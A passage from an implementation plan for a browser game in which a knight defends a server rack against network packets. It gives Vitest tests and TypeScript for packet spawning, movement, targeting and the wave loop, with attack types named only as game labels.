    const fix = serverFix(p.t, s.owned);
    if (fix) {
      earn(s, POINTS.neutralized);
      s.stats.neutralized++;
      ev.push({ type: 'resolved', packet: p, outcome: 'neutralized', damage: 0, fixId: fix });
      floatAtRack(ev, 'neutralized', POINTS.neutralized);
      log(s, ev, { outcome: 'neutralized', packet: p, points: POINTS.neutralized, ruleId: fix });
    } else {
      const kind = p.t.kind as MaliciousKind;
      const dmg = DAMAGE[kind];
      const before = s.uptime;
      if (!s.god) s.uptime = Math.max(0, s.uptime - dmg);
      s.stats.breaches[kind]++;
      ev.push({ type: 'resolved', packet: p, outcome: 'breach', damage: dmg });
      ev.push({ type: 'uptime', before, after: s.uptime });
      floatAtRack(ev, 'damage', dmg);
      log(s, ev, { outcome: 'breach', packet: p, points: 0, damage: dmg });
      if (!s.seenBreach) { s.seenBreach = true; say(ev, 'firstBreach'); }
      else if (s.uptime < 25) say(ev, 'invincible');
      else if (s.uptime < 55) say(ev, 'fleshWound');
    }
  }
  checkEnd(s, ev);
};
```

Run: `npx vitest run src/core` → PASS.

- [ ] **Step 6: Commit**

```bash
git add src/core
git commit -m "Add the run state, event types and outcome rules" -m "Hits, false positives, rule blocks and the rack's verdicts are decided in one place, so scoring, reputation, uptime and the log can never disagree with what the player sees." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 6: Spawning, packet movement and the fire wall

**Files:**
- Create: `src/core/field.ts`
- Test: `src/core/field.test.ts`

**Interfaces:**
- Consumes: Task 5 (`RunState`, `Packet`, `kill`, `resolve`, `untarget`, `packetSpeed`), Task 4 (`firewallRule`, `lockdownBlocks`, `tarpitSlows`), Task 3 (`WaveDef`, `waveFor`), Task 2 (`TEMPLATES`, `Rng`, `pick`, `docIp`).
- Produces: `pickTemplate(rng: Rng, def: WaveDef): Template`; `spawn(s: RunState, rng: Rng, ev: RunEvent[]): Packet | null`; `stepPackets(s, dt, ev): void`; `stepPending(s, dt, ev): void`.

- [ ] **Step 1: Write the failing test**

`src/core/field.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { BASE_SPEED, ENTER_MULT, FW_X, HOLD_MULT, LANE_X0, PKT_W, RESOLVE_DELAY } from './constants';
import { CAMPAIGN } from './content/waves';
import type { RunEvent } from './events';
import { pickTemplate, spawn, stepPackets, stepPending } from './field';
import { mulberry32 } from './rng';
import { freshState, place } from './testkit';

describe('pickTemplate', () => {
  it('respects a wave\'s allowed families', () => {
    const rng = mulberry32(3);
    for (let i = 0; i < 300; i++) expect(['legit', 'scan']).toContain(pickTemplate(rng, CAMPAIGN[0]).kind);
  });
  it('boosts the wave\'s family', () => {
    const rng = mulberry32(4);
    const kinds = Array.from({ length: 2000 }, () => pickTemplate(rng, CAMPAIGN[4]).kind);
    expect(kinds.filter((k) => k === 'flood').length).toBeGreaterThan(kinds.filter((k) => k === 'xss').length);
  });
});

describe('spawn', () => {
  it('puts the packet behind the gutter and records repeat IPs on auth lanes', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.wave = 2;
    let p = null;
    for (let i = 0; i < 20 && !(p && p.lane <= 1); i++) { s.packets = []; p = spawn(s, mulberry32(i), ev); }
    expect(p!.x).toBe(LANE_X0 - PKT_W);
    expect(s.seen[p!.src]).toBeGreaterThanOrEqual(1);
    expect(ev.some((e) => e.type === 'spawned')).toBe(true);
  });
  it('never stacks two packets at the lane mouth', () => {
    const s = freshState(), ev: RunEvent[] = [];
    const rng = mulberry32(11);
    for (let i = 0; i < 40; i++) spawn(s, rng, ev);
    for (const a of s.packets) for (const b of s.packets) {
      if (a !== b && a.lane === b.lane) expect(Math.abs(a.x - b.x)).toBeGreaterThanOrEqual(PKT_W);
    }
    expect(s.packets.length).toBeLessThanOrEqual(5);
  });
});

describe('stepPackets', () => {
  it('moves packets at wave speed, slower while held', () => {
    const s = freshState(), ev: RunEvent[] = [];
    const a = place(s, 'legit-socks', 100), b = place(s, 'legit-login', 100);
    b.held = true;
    stepPackets(s, 1, ev);
    expect(a.x).toBeCloseTo(100 + BASE_SPEED);
    expect(b.x).toBeCloseTo(100 + BASE_SPEED * HOLD_MULT);
  });

  it('stops scans at the port panel', () => {
    const s = freshState(), ev: RunEvent[] = [];
    const p = place(s, 'scan-rdp', 826 - PKT_W - 1);
    stepPackets(s, 0.1, ev);
    expect(p.dead).toBe(true);
    expect(ev).toContainEqual(expect.objectContaining({ type: 'shattered', by: 'rule', ruleId: 'lockdown' }));
  });

  it('runs firewall rules at the fire, otherwise lets the fire eat the packet', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.owned.push('quote');
    const blocked = place(s, 'sqli-tautology', FW_X - PKT_W - 1);
    const passes = place(s, 'sqli-encoded', FW_X - PKT_W - 1);
    stepPackets(s, 0.1, ev);
    expect(blocked.dead).toBe(true);
    expect(passes.entering).toBe(true);
    expect(ev).toContainEqual({ type: 'entered', packetId: passes.id });
  });

  it('consumes an entering packet at enter speed, then resolves it after the delay', () => {
    const s = freshState(), ev: RunEvent[] = [];
    const p = place(s, 'legit-socks', FW_X - PKT_W + 1);
    stepPackets(s, 0.01, ev);
    expect(p.entering).toBe(true);
    const secs = PKT_W / (BASE_SPEED * ENTER_MULT) + 0.05;
    for (let t = 0; t < secs; t += 1 / 60) stepPackets(s, 1 / 60, ev);
    expect(p.dead).toBe(true);
    expect(s.pending.length).toBe(1);
    expect(ev).toContainEqual({ type: 'consumed', packetId: p.id });
    stepPending(s, RESOLVE_DELAY / 2, ev);
    expect(s.stats.served).toBe(0);
    stepPending(s, RESOLVE_DELAY, ev);
    expect(s.stats.served).toBe(1);
    expect(s.pending.length).toBe(0);
  });

  it('untargets a packet that reaches the fire', () => {
    const s = freshState(), ev: RunEvent[] = [];
    const p = place(s, 'legit-socks', FW_X - PKT_W - 1);
    s.locked = p.id;
    stepPackets(s, 0.1, ev);
    expect(s.locked).toBeNull();
  });

  it('marks packets slowed by the tarpit', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.owned.push('tarpit');
    s.seen['203.0.113.66'] = 3;
    const p = place(s, 'brute-admin', 400, '203.0.113.66');
    stepPackets(s, 1, ev);
    expect(p.slowed).toBe(true);
    expect(p.x).toBeCloseTo(400 + BASE_SPEED * 0.4);
  });

  it('stops processing once the run ends mid-step', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.uptime = 1;
    const a = place(s, 'sqli-union', FW_X - 1);
    a.entering = true; a.checked = true;
    stepPackets(s, 0.1, ev);
    stepPending(s, 1, ev);
    expect(s.phase).toBe('ended');
  });
});
```

Run: `npx vitest run src/core/field.test.ts` → FAIL.

- [ ] **Step 2: Implement `src/core/field.ts`**

```ts
// core
import { BRUTE_IPS, ENTER_MULT, FW_X, HOLD_MULT, LANE_X0, LOCK_X, PKT_W, RESOLVE_DELAY, SPAWN_GAP, TAR_MULT } from './constants';
import { TEMPLATES } from './content/packets';
import { waveFor, type WaveDef } from './content/waves';
import type { RunEvent } from './events';
import { kill, resolve, untarget } from './outcomes';
import { docIp, pick, type Rng } from './rng';
import { firewallRule, lockdownBlocks, tarpitSlows } from './rules';
import { packetSpeed, type Packet, type RunState } from './state';
import type { Template } from './types';

const weightIn = (def: WaveDef, t: Template): number => {
  if (def.only && !def.only.includes(t.kind)) return 0;
  return t.weight * (def.boost[t.kind] ?? 1) * (t.tier === 3 ? def.tier3Mult : 1);
};

export const pickTemplate = (rng: Rng, def: WaveDef): Template => {
  const total = TEMPLATES.reduce((a, t) => a + weightIn(def, t), 0);
  let r = rng() * total;
  for (const t of TEMPLATES) {
    const w = weightIn(def, t);
    if (w <= 0) continue;
    r -= w;
    if (r < 0) return t;
  }
  return TEMPLATES.filter((t) => weightIn(def, t) > 0).at(-1)!;
};

export const spawn = (s: RunState, rng: Rng, ev: RunEvent[]): Packet | null => {
  const def = waveFor(s.cfg.mode, s.wave);
  const startX = LANE_X0 - PKT_W;
  for (let tries = 0; tries < 5; tries++) {
    const t = pickTemplate(rng, def);
    if (s.packets.some((p) => !p.dead && p.lane === t.lane && p.x < startX + PKT_W + SPAWN_GAP)) continue;
    const src = t.fixedSrc ?? (t.kind === 'brute' && rng() < 0.6 ? pick(rng, BRUTE_IPS) : docIp(rng));
    if (t.lane <= 1) s.seen[src] = (s.seen[src] ?? 0) + 1;
    const p: Packet = { id: s.nextId++, t, src, lane: t.lane, x: startX, checked: false, entering: false, doomed: false, held: false, slowed: false, dead: false };
    s.packets.push(p);
    ev.push({ type: 'spawned', packet: p });
    return p;
  }
  return null;
};

export const stepPackets = (s: RunState, dt: number, ev: RunEvent[]): void => {
  const base = packetSpeed(s);
  for (const p of s.packets) {
    if (s.phase !== 'playing') return;
    if (p.dead) continue;
    let v = base;
    if (p.entering) v *= ENTER_MULT;
    else {
      if (p.held) v *= HOLD_MULT;
      p.slowed = tarpitSlows(p, s.owned, s.seen);
      if (p.slowed) v *= TAR_MULT;
    }
    p.x += v * dt;
    if (!p.checked && lockdownBlocks(p.t, s.owned) && p.x + PKT_W >= LOCK_X) {
      p.checked = true;
      kill(s, p, 'rule', ev, 'lockdown');
      continue;
    }
    if (!p.checked && p.x + PKT_W >= FW_X) {
      p.checked = true;
      const rule = firewallRule(p, s.owned, s.fails);
      if (rule) { kill(s, p, 'rule', ev, rule); continue; }
      p.entering = true;
      if (s.locked === p.id) untarget(s, ev);
      ev.push({ type: 'entered', packetId: p.id });
    }
    if (p.entering && p.x >= FW_X) {
      p.dead = true;
      s.pending.push({ packet: p, t: RESOLVE_DELAY });
      ev.push({ type: 'consumed', packetId: p.id });
    }
  }
};

export const stepPending = (s: RunState, dt: number, ev: RunEvent[]): void => {
  for (const q of s.pending) q.t -= dt;
  const due = s.pending.filter((q) => q.t <= 0);
  s.pending = s.pending.filter((q) => q.t > 0);
  for (const q of due) {
    if (s.phase !== 'playing') return;
    resolve(s, q.packet, ev);
  }
};
```

Run: `npx vitest run src/core` → PASS.

- [ ] **Step 3: Commit**

```bash
git add src/core/field.ts src/core/field.test.ts
git commit -m "Add spawning, packet movement and the fire wall" -m "Packets now travel, slow in tar or while held, die at the port panel or a firewall rule, and otherwise burn into the rack, which rules on them a beat later." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 7: The knight: lanes, targeting, spears, the Destrier and the Squire

**Files:**
- Create: `src/core/knight.ts`
- Test: `src/core/knight.test.ts`

**Interfaces:**
- Consumes: Task 5 (`RunState`, `Packet`, `untarget`, `kill`, `say`, `findPacket`, `mounted`, `knightY`, `packetY`, `packetSpeed`), constants.
- Produces: `handPos(s): Point`; `setLane(s, lane: number, ev)`; `target(s, id: number | null, ev)`; `cycleTarget(s, dir: 1 | -1, ev)`; `throwSpear(s, ev)`; `stepKnight(s, dt, ev)`; `stepSpears(s, dt, ev)`; `stepSquire(s, dt, ev)`.

- [ ] **Step 1: Write the failing test**

`src/core/knight.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { FW_X, HOLD_SECS, KN_X, LANE_H, PKT_W, SPEAR_SPEED, SQUIRE_COOLDOWN, THROW_COOLDOWN } from './constants';
import type { RunEvent } from './events';
import { cycleTarget, handPos, setLane, stepKnight, stepSpears, stepSquire, target, throwSpear } from './knight';
import { freshState, place } from './testkit';

describe('lanes', () => {
  it('clamps lanes and announces changes', () => {
    const s = freshState(), ev: RunEvent[] = [];
    setLane(s, 9, ev);
    expect(s.knight.lane).toBe(4);
    setLane(s, -3, ev);
    expect(s.knight.lane).toBe(0);
    expect(ev).toEqual([{ type: 'laneChanged', lane: 4 }, { type: 'laneChanged', lane: 0 }]);
    setLane(s, 0, ev);
    expect(ev.length).toBe(2);
  });

  it('drops a target on another lane when the knight leaves', () => {
    const s = freshState(), ev: RunEvent[] = [];
    const p = place(s, 'sqli-union', 300);
    target(s, p.id, ev);
    setLane(s, 3, ev);
    expect(s.locked).toBeNull();
  });
});

describe('targeting', () => {
  it('cycles the knight\'s lane front-most first, both directions, wrapping', () => {
    const s = freshState(), ev: RunEvent[] = [];
    const back = place(s, 'sqli-union', 100), front = place(s, 'legit-socks', 500), mid = place(s, 'decoy-union', 300);
    place(s, 'brute-admin', 700);
    cycleTarget(s, 1, ev); expect(s.locked).toBe(front.id);
    cycleTarget(s, 1, ev); expect(s.locked).toBe(mid.id);
    cycleTarget(s, 1, ev); expect(s.locked).toBe(back.id);
    cycleTarget(s, 1, ev); expect(s.locked).toBe(front.id);
    cycleTarget(s, -1, ev); expect(s.locked).toBe(back.id);
  });

  it('says so when the lane is empty', () => {
    const s = freshState(), ev: RunEvent[] = [];
    setLane(s, 0, ev);
    cycleTarget(s, 1, ev);
    expect(ev).toContainEqual({ type: 'say', line: 'emptyLane' });
  });

  it('moves the knight to the target\'s lane and ignores doomed or entering packets', () => {
    const s = freshState(), ev: RunEvent[] = [];
    const p = place(s, 'brute-ssh-root', 300);
    target(s, p.id, ev);
    expect(s.knight.lane).toBe(0);
    const q = place(s, 'brute-admin', 300); q.doomed = true;
    target(s, q.id, ev);
    expect(s.locked).toBe(p.id);
  });

  it('holds the packet when mounted', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.owned.push('destrier');
    const p = place(s, 'sqli-union', 300);
    target(s, p.id, ev);
    expect(p.held).toBe(true);
    expect(s.knight.hold).toBe(HOLD_SECS);
    target(s, null, ev);
    expect(p.held).toBe(false);
  });
});

describe('spears', () => {
  it('needs a target, then flies for distance / speed and hits', () => {
    const s = freshState(), ev: RunEvent[] = [];
    throwSpear(s, ev);
    expect(ev).toContainEqual({ type: 'say', line: 'noTarget' });
    const p = place(s, 'sqli-union', 300);
    target(s, p.id, ev);
    const from = handPos(s);
    const ev2: RunEvent[] = [];
    throwSpear(s, ev2);
    const thrown = ev2.find((e) => e.type === 'thrown')!;
    expect(thrown).toMatchObject({ type: 'thrown', packetId: p.id, by: 'knight', from });
    const d = Math.hypot(300 + PKT_W * 0.55 - from.x, 2 * LANE_H + 19 + 26 - from.y);
    expect((thrown as { duration: number }).duration).toBeCloseTo(Math.max(0.12, d / SPEAR_SPEED));
    expect(p.doomed).toBe(true);
    expect(s.locked).toBeNull();
    stepSpears(s, 10, ev2);
    expect(p.dead).toBe(true);
    expect(s.stats.hits[2]).toBe(1);
  });

  it('enforces the cooldown against Space spam', () => {
    const s = freshState(), ev: RunEvent[] = [];
    const a = place(s, 'sqli-union', 300), b = place(s, 'sqli-sleep', 0);
    target(s, a.id, ev); throwSpear(s, ev);
    target(s, b.id, ev); throwSpear(s, ev);
    expect(s.spears.length).toBe(1);
    stepKnight(s, THROW_COOLDOWN + 0.01, ev);
    throwSpear(s, ev);
    expect(s.spears.length).toBe(2);
  });

  it('misses when the packet entered the fire first', () => {
    const s = freshState(), ev: RunEvent[] = [];
    const p = place(s, 'sqli-union', 300);
    target(s, p.id, ev); throwSpear(s, ev);
    p.entering = true;
    stepSpears(s, 10, ev);
    expect(p.dead).toBe(false);
    expect(ev).toContainEqual({ type: 'missed', packetId: p.id });
  });
});

describe('stepKnight', () => {
  it('walks to the lane on foot and rides out to a held packet', () => {
    const s = freshState(), ev: RunEvent[] = [];
    setLane(s, 0, ev);
    for (let i = 0; i < 120; i++) stepKnight(s, 1 / 60, ev);
    expect(s.knight.y).toBe(0);
    expect(s.knight.x).toBe(KN_X);
    s.owned.push('destrier');
    const p = place(s, 'sqli-union', 200);
    target(s, p.id, ev);
    for (let i = 0; i < 120; i++) stepKnight(s, 1 / 60, ev);
    expect(s.knight.x).toBeCloseTo(200 + PKT_W + 6);
    expect(s.knight.y).toBe(2 * LANE_H - 6);
  });

  it('lets go when the hold runs out', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.owned.push('destrier');
    const p = place(s, 'sqli-union', 200);
    target(s, p.id, ev);
    stepKnight(s, HOLD_SECS + 0.1, ev);
    expect(s.locked).toBeNull();
    expect(p.held).toBe(false);
  });

  it('never rides past his post', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.owned.push('destrier');
    const p = place(s, 'sqli-union', FW_X - PKT_W - 2);
    target(s, p.id, ev);
    for (let i = 0; i < 60; i++) stepKnight(s, 1 / 60, ev);
    expect(s.knight.x).toBeLessThanOrEqual(KN_X);
  });
});

describe('squire', () => {
  it('throws at obvious attacks only, then cools down', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.owned.push('squire');
    s.squire.cd = 0;
    place(s, 'legit-socks', 400);
    place(s, 'sqli-union', 500);
    stepSquire(s, 0.01, ev);
    expect(s.spears.length).toBe(0);
    const obvious = place(s, 'sqli-tautology', 300);
    s.squire.cd = 0;
    stepSquire(s, 0.01, ev);
    expect(s.spears.length).toBe(1);
    expect(obvious.doomed).toBe(true);
    expect(s.squire.cd).toBeCloseTo(SQUIRE_COOLDOWN);
    expect(ev).toContainEqual(expect.objectContaining({ type: 'thrown', by: 'squire' }));
  });

  it('does nothing without the card', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.squire.cd = 0;
    place(s, 'sqli-tautology', 300);
    stepSquire(s, 0.01, ev);
    expect(s.spears.length).toBe(0);
  });
});
```

Run: `npx vitest run src/core/knight.test.ts` → FAIL.

- [ ] **Step 2: Implement `src/core/knight.ts`**

```ts
// core
import { FW_X, HOLD_MULT, HOLD_SECS, KN_X, KNIGHT_FOOT_SPEED, KNIGHT_HORSE_SPEED, LANE_COUNT, LANE_X0, PKT_H, PKT_W, SPEAR_SPEED, SQUIRE_COOLDOWN, SQUIRE_HAND, TAR_MULT, THROW_COOLDOWN } from './constants';
import type { RunEvent } from './events';
import { kill, say, untarget } from './outcomes';
import { findPacket, knightY, mounted, packetSpeed, packetY, type Packet, type RunState, type Thrower } from './state';
import type { LaneIndex, Point } from './types';

export const handPos = (s: RunState): Point =>
  mounted(s) ? { x: s.knight.x + 64, y: s.knight.y + 24 } : { x: s.knight.x + 36, y: s.knight.y + 30 };

export const setLane = (s: RunState, lane: number, ev: RunEvent[]): void => {
  const l = Math.max(0, Math.min(LANE_COUNT - 1, Math.round(lane))) as LaneIndex;
  if (l === s.knight.lane) return;
  const p = s.locked !== null ? findPacket(s, s.locked) : undefined;
  if (p && p.lane !== l) untarget(s, ev);
  s.knight.lane = l;
  ev.push({ type: 'laneChanged', lane: l });
};

export const target = (s: RunState, id: number | null, ev: RunEvent[]): void => {
  if (id === null) { untarget(s, ev); return; }
  const p = findPacket(s, id);
  if (!p || p.doomed || p.entering) return;
  if (s.locked !== null && s.locked !== id) untarget(s, ev);
  s.locked = id;
  if (s.knight.lane !== p.lane) { s.knight.lane = p.lane; ev.push({ type: 'laneChanged', lane: p.lane }); }
  if (mounted(s)) { p.held = true; s.knight.hold = HOLD_SECS; }
  ev.push({ type: 'targeted', packetId: id });
};

export const cycleTarget = (s: RunState, dir: 1 | -1, ev: RunEvent[]): void => {
  const lane = s.packets
    .filter((p) => !p.dead && !p.doomed && !p.entering && p.lane === s.knight.lane && p.x + PKT_W > LANE_X0 + 10)
    .sort((a, b) => b.x - a.x);
  if (!lane.length) { say(ev, 'emptyLane'); return; }
  const i = s.locked === null ? -1 : lane.findIndex((p) => p.id === s.locked);
  const next = i < 0 ? (dir > 0 ? lane[0] : lane[lane.length - 1]) : lane[(i + dir + lane.length) % lane.length];
  target(s, next.id, ev);
};

const launch = (s: RunState, p: Packet, from: Point, by: Thrower, ev: RunEvent[]): void => {
  const to = { x: p.x + PKT_W * 0.55, y: packetY(p) + PKT_H / 2 };
  const duration = Math.max(0.12, Math.hypot(to.x - from.x, to.y - from.y) / SPEAR_SPEED);
  const v = packetSpeed(s) * (p.held ? HOLD_MULT : 1) * (p.slowed ? TAR_MULT : 1);
  s.spears.push({ packet: p, by, t: duration });
  ev.push({ type: 'thrown', packetId: p.id, by, from, to: { x: to.x + v * duration, y: to.y }, duration });
};

export const throwSpear = (s: RunState, ev: RunEvent[]): void => {
  if (s.knight.cooldown > 0) return;
  const p = s.locked !== null ? findPacket(s, s.locked) : undefined;
  if (!p) { say(ev, 'noTarget'); return; }
  const from = handPos(s);
  untarget(s, ev);
  p.doomed = true;
  s.knight.cooldown = THROW_COOLDOWN;
  s.knight.throwT = 0.3;
  launch(s, p, from, 'knight', ev);
};

export const stepKnight = (s: RunState, dt: number, ev: RunEvent[]): void => {
  const k = s.knight;
  k.cooldown = Math.max(0, k.cooldown - dt);
  k.throwT = Math.max(0, k.throwT - dt);
  const isMounted = mounted(s);
  let ride = isMounted && s.locked !== null ? findPacket(s, s.locked) : undefined;
  if (ride) {
    k.hold -= dt;
    if (k.hold <= 0) { untarget(s, ev); ride = undefined; }
  }
  const tx = ride ? Math.min(KN_X, ride.x + PKT_W + 6) : KN_X;
  const ty = knightY(ride ? ride.lane : k.lane, isMounted);
  const dx = tx - k.x, dy = ty - k.y, d = Math.hypot(dx, dy);
  const stepLen = (isMounted ? KNIGHT_HORSE_SPEED : KNIGHT_FOOT_SPEED) * dt;
  if (d <= Math.max(stepLen, 0.01)) {
    k.x = tx; k.y = ty; k.moving = false;
  } else {
    k.x += (dx / d) * stepLen; k.y += (dy / d) * stepLen; k.moving = true;
    k.facing = dx > 4 ? 'right' : 'left';
  }
};

export const stepSpears = (s: RunState, dt: number, ev: RunEvent[]): void => {
  for (const sp of s.spears) sp.t -= dt;
  const due = s.spears.filter((sp) => sp.t <= 0);
  s.spears = s.spears.filter((sp) => sp.t > 0);
  for (const sp of due) {
    if (s.phase !== 'playing') return;
    const p = sp.packet;
    if (!p.dead && !p.entering) kill(s, p, sp.by, ev);
    else ev.push({ type: 'missed', packetId: p.id });
  }
};

export const stepSquire = (s: RunState, dt: number, ev: RunEvent[]): void => {
  if (!s.owned.includes('squire')) return;
  s.squire.throwT = Math.max(0, s.squire.throwT - dt);
  s.squire.cd -= dt;
  if (s.squire.cd > 0) return;
  const c = s.packets
    .filter((p) => !p.dead && !p.doomed && !p.held && !p.entering && p.t.kind !== 'legit' && p.t.tier === 1 && p.x > 130 && p.x + PKT_W < FW_X)
    .sort((a, b) => b.x - a.x)[0];
  if (!c) { s.squire.cd = 0.5; return; }
  c.doomed = true;
  if (s.locked === c.id) untarget(s, ev);
  s.squire.throwT = 0.3;
  s.squire.cd = SQUIRE_COOLDOWN;
  launch(s, c, { ...SQUIRE_HAND }, 'squire', ev);
};
```

Run: `npx vitest run src/core` → PASS.

- [ ] **Step 3: Commit**

```bash
git add src/core/knight.ts src/core/knight.test.ts
git commit -m "Add the knight, the Destrier and the Squire to the core" -m "Lane moves, Tab cycling, spear flight and the horse's hold are simulated, not animated, so the hit lands on the same frame whatever the view is doing." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 8: The Run: step order, waves, drafts and cheats

**Files:**
- Create: `src/core/run.ts`
- Test: `src/core/run.test.ts`

**Interfaces:**
- Consumes: Tasks 2–7.
- Produces: `class Run` with
  - `constructor(cfg: RunConfig)`, `readonly state: RunState`, `get waveDef(): WaveDef`
  - `start(): RunEvent[]` (emits `waveStarted` + `say waveStart`)
  - `step(dt: number): RunEvent[]`
  - intents (no-ops unless `phase === 'playing'`): `moveLane(d: 1 | -1)`, `setLane(l: number)`, `cycleTarget(dir: 1 | -1)`, `target(id: number | null)`, `throwSpear()`
  - `setHints(on: boolean): void`
  - draft (no-ops unless `phase === 'draft'`): `pick(index: number)`, `reroll()`, `nextWave()`
  - `cheat(kind: 'god' | 'credits' | 'skip', amount?: number): RunEvent[]`

- [ ] **Step 1: Write the failing test**

`src/core/run.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { STEP } from './constants';
import type { RunEvent } from './events';
import { Run } from './run';
import { cfg, place } from './testkit';

const playWave = (run: Run, onStep?: (run: Run, ev: RunEvent[]) => void): RunEvent[] => {
  const all: RunEvent[] = [];
  for (let i = 0; i < 60 * 120 && run.state.phase === 'playing'; i++) {
    const ev = run.step(STEP);
    all.push(...ev);
    onStep?.(run, ev);
  }
  return all;
};

describe('Run', () => {
  it('starts wave one with the knight\'s line', () => {
    const run = new Run(cfg());
    expect(run.start()).toEqual([{ type: 'waveStarted', wave: 1 }, { type: 'say', line: 'waveStart', wave: 1 }]);
  });

  it('plays recon to a draft without damage: lockdown stops every scan', () => {
    const run = new Run(cfg({ seed: 42 }));
    run.start();
    const ev = playWave(run);
    expect(run.state.phase).toBe('draft');
    expect(run.state.uptime).toBe(100);
    expect(run.state.stats.ruleBlocks).toBeGreaterThan(0);
    expect(run.state.stats.served).toBeGreaterThan(0);
    expect(ev).toContainEqual({ type: 'waveCleared', wave: 1 });
    const draft = run.state.draft!;
    expect(draft.picks.map((c) => c.id).slice(0, 2)).toEqual(['destrier', 'obs1']);
    expect(draft.free).toBe(true);
  });

  it('is deterministic for a seed and inputs', () => {
    const a = new Run(cfg({ seed: 7 })), b = new Run(cfg({ seed: 7 }));
    a.start(); b.start();
    playWave(a); playWave(b);
    expect(a.state.score).toBe(b.state.score);
    expect(a.state.log.map((e) => e.packet.t.id)).toEqual(b.state.log.map((e) => e.packet.t.id));
  });

  it('takes the first pick free, then charges, never twice, never into debt', () => {
    const run = new Run(cfg({ seed: 42 }));
    run.start(); playWave(run);
    const s = run.state;
    s.credits = 700;
    run.pick(0);
    expect(s.owned).toContain('destrier');
    expect(s.credits).toBe(700);
    run.pick(0);
    expect(s.owned.filter((c) => c === 'destrier').length).toBe(1);
    run.pick(1);
    expect(s.owned).toContain('obs1');
    expect(s.credits).toBe(450);
    const third = s.draft!.picks[2];
    s.credits = 10;
    run.pick(2);
    expect(s.owned).not.toContain(third.id === 'backup' ? 'nothing' : third.id);
    expect(s.credits).toBe(10);
  });

  it('rerolls for credits only when affordable, keeping taken cards out', () => {
    const run = new Run(cfg({ seed: 42 }));
    run.start(); playWave(run);
    const s = run.state;
    run.pick(0);
    s.credits = 100;
    expect(run.reroll()).toEqual([]);
    s.credits = 400;
    run.reroll();
    expect(s.credits).toBe(250);
    expect(s.draft!.picks.map((c) => c.id)).not.toContain('destrier');
  });

  it('restores uptime with a backup without adding it to the loadout', () => {
    const run = new Run(cfg({ seed: 42 }));
    run.start(); playWave(run);
    const s = run.state;
    s.uptime = 50;
    s.draft!.picks[0] = { ...s.draft!.picks[0], id: 'backup', rarity: 'COMMON' };
    run.pick(0);
    expect(s.uptime).toBe(80);
    expect(s.owned).not.toContain('backup');
  });

  it('moves to the next wave and wins after the sixth', () => {
    const run = new Run(cfg({ seed: 3 }));
    run.start();
    run.cheat('god');
    for (let w = 1; w <= 6; w++) {
      playWave(run);
      if (w < 6) {
        expect(run.state.phase).toBe('draft');
        const ev = run.nextWave();
        expect(ev[0]).toEqual({ type: 'waveStarted', wave: w + 1 });
      }
    }
    expect(run.state.phase).toBe('ended');
    expect(run.state.endReason).toBe('won');
    expect(run.state.stats.wavesCleared).toBe(6);
  });

  it('pays overtime a bonus per cleared wave', () => {
    const run = new Run(cfg({ mode: 'overtime', seed: 5 }));
    run.start(); run.cheat('god');
    const before = run.state.score;
    playWave(run);
    expect(run.state.phase).toBe('draft');
    expect(run.state.score).toBeGreaterThanOrEqual(before + 500);
  });

  it('ignores intents in the wrong phase', () => {
    const run = new Run(cfg({ seed: 42 }));
    run.start(); playWave(run);
    expect(run.throwSpear()).toEqual([]);
    expect(run.moveLane(1)).toEqual([]);
    const fresh = new Run(cfg());
    expect(fresh.pick(0)).toEqual([]);
    expect(fresh.nextWave()).toEqual([]);
  });

  it('marks cheats as tampering and skip ends the wave', () => {
    const run = new Run(cfg({ seed: 42 }));
    run.start();
    for (let i = 0; i < 300; i++) run.step(STEP);
    const ev = run.cheat('skip');
    expect(run.state.tampered).toBe(true);
    expect(ev).toContainEqual({ type: 'waveCleared', wave: 1 });
    run.cheat('credits', 900);
    expect(run.state.credits).toBeGreaterThanOrEqual(900);
  });

  it('applies the hints multiplier from the moment it is switched on', () => {
    const run = new Run(cfg({ seed: 1 }));
    run.start();
    run.setHints(true);
    const s = run.state;
    const p = place(s, 'sqli-tautology', 400);
    run.target(p.id);
    run.throwSpear();
    for (let i = 0; i < 60; i++) run.step(STEP);
    expect(s.score).toBe(Math.round(50 * 0.75));
  });
});
```

Run: `npx vitest run src/core/run.test.ts` → FAIL.

- [ ] **Step 2: Implement `src/core/run.ts`**

```ts
// core
import { POINTS } from './constants';
import { CAMPAIGN, waveFor, type WaveDef } from './content/waves';
import { deal, PRICE, REROLL_COST } from './draft';
import type { RunEvent } from './events';
import { spawn, stepPackets, stepPending } from './field';
import { cycleTarget, setLane, stepKnight, stepSpears, stepSquire, target, throwSpear } from './knight';
import { endRun, untarget } from './outcomes';
import { mulberry32, type Rng } from './rng';
import { createState, multiplier, type RunConfig, type RunState } from './state';

export class Run {
  readonly state: RunState;
  private readonly rng: Rng;

  constructor(cfg: RunConfig) {
    this.rng = mulberry32(cfg.seed);
    this.state = createState(cfg);
  }

  get waveDef(): WaveDef {
    return waveFor(this.state.cfg.mode, this.state.wave);
  }

  start(): RunEvent[] {
    return [{ type: 'waveStarted', wave: this.state.wave }, { type: 'say', line: 'waveStart', wave: this.state.wave }];
  }

  step(dt: number): RunEvent[] {
    const s = this.state, ev: RunEvent[] = [];
    if (s.phase !== 'playing') return ev;
    s.timeLeft -= dt;
    s.spawnT -= dt;
    if (s.spawnT <= 0 && s.timeLeft > 4) { spawn(s, this.rng, ev); s.spawnT = this.waveDef.spawn; }
    stepKnight(s, dt, ev);
    stepPackets(s, dt, ev);
    stepSpears(s, dt, ev);
    stepPending(s, dt, ev);
    stepSquire(s, dt, ev);
    s.packets = s.packets.filter((p) => !p.dead);
    if (s.phase === 'playing' && s.timeLeft <= 0 && !s.packets.length && !s.pending.length && !s.spears.length) this.clearWave(ev);
    return ev;
  }

  private act(fn: (ev: RunEvent[]) => void): RunEvent[] {
